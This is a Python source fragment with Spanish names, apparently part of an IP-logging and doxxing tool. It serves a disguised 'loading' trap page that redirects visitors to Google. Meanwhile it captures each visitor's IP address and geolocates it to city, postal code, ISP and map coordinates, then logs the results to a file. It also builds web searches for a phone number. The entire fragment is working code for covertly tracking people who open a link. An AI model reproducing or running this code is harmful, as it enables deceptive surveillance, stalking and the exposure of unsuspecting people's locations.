def obtener_coordenadas_pais(codigo_region):
    coordenadas = {
        "AR": "-34.6037,-58.3816", "MX": "19.4326,-99.1332", "CO": "4.7110,-74.0721",
        "ES": "40.4167,-3.7037",  "PE": "-12.0464,-77.0428", "CL": "-33.4489,-70.6693",
        "VE": "10.4806,-66.9036", "EC": "-0.1807,-78.4678", "BR": "-15.7938,-47.8828",
        "US": "37.0902,-95.7129", "UY": "-34.9011,-56.1645", "BO": "-16.2902,-63.5887"
    }
    return coordenadas.get(codigo_region.upper(), "0.0000,0.0000")


def generar_link_rastros_web(numero_telefono):
    query = f'"{numero_telefono}"'
    query_codificada = urllib.parse.quote_plus(query)
    url_completa = f"https://www.google.com/search?q={query_codificada}"
    return url_completa


def procesar_y_mostrar_ip(ip_capturada):
    print(f"\n\033[1;32m[⚡] IP CAPTURADA: {ip_capturada}\033[0m")
    
    url = f"http://ip-api.com/json/{ip_capturada}?fields=status,message,country,regionName,city,zip,lat,lon,isp"
    try:
        echo = requests.get(url, timeout=10)
        datos = echo.json()
        
        if datos["status"] == "success":
            lat = datos["lat"]
            lon = datos["lon"]
            mapa_url = f"https://www.google.com/maps?q={lat},{lon}"
            
            print("\n\033[1;32m[✓] ANÁLISIS GEOGRÁFICO DE IP:\033[0m")
            print(f" \033[1;36mPAÍS:\033[0m {datos['country']}")
            print(f" \033[1;36mPROVINCIA/ESTADO:\033[0m {datos['regionName']}")
            print(f" \033[1;36mLOCALIDAD/CIUDAD:\033[0m {datos['city']}")
            print(f" \033[1;36mCÓDIGO POSTAL:\033[0m {datos['zip'] if datos['zip'] else 'No disponible'}")
            print(f" \033[1;36mPROVEEDOR (ISP):\033[0m {datos['isp']}")
            print(f" \033[1;36mCOORDENADAS:\033[0m {lat}, {lon}")
            print(f"\n\033[1;33m[+] ENLACE GOOGLE MAPS:\033[0m\n {mapa_url}")
            
            reporte_path = os.path.join(BASE_DIR, "result-trx-kill.txt")
            with open(reporte_path, "a", encoding="utf-8") as f:
                f.write("\n=====================================================\n")
                f.write(f"IP CAPTURADA: {ip_capturada}\n")
                f.write(f"UBICACIÓN: {datos['city']}, {datos['regionName']}, {datos['country']}\n")
                f.write(f"PROVEEDOR: {datos['isp']}\n")
                f.write(f"MAPA: {mapa_url}\n")
                f.write("=====================================================\n")
        else:
            print("\033[1;31m[!] No se pudieron obtener detalles para esta IP.\033[0m")
    except Exception as e:
        print(f"\033[1;31m[!] Error en la solicitud de red: {e}\033[0m")


class ServidorIPLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        ip_cliente = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
        
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html_trampa = """
        <html>
        <head>
            <title>Cargando...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
            <script>
                setTimeout(function(){
                    window.location.href = "https://www.google.com";
                }, 1500);
            </script>
        </head>
        <body>
            <div style="text-align: center;">
                <div class="loader" style="margin: 0 auto 20px;"></div>
                <p>Cargando el recurso solicitado...</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(html_trampa.encode('utf-8'))
        
        if "favicon.ico" not in self.path:
            threading.Thread(target=procesar_y_mostrar_ip, args=(ip_cliente,)).start()

    def log_message(self, format, *args):
        return


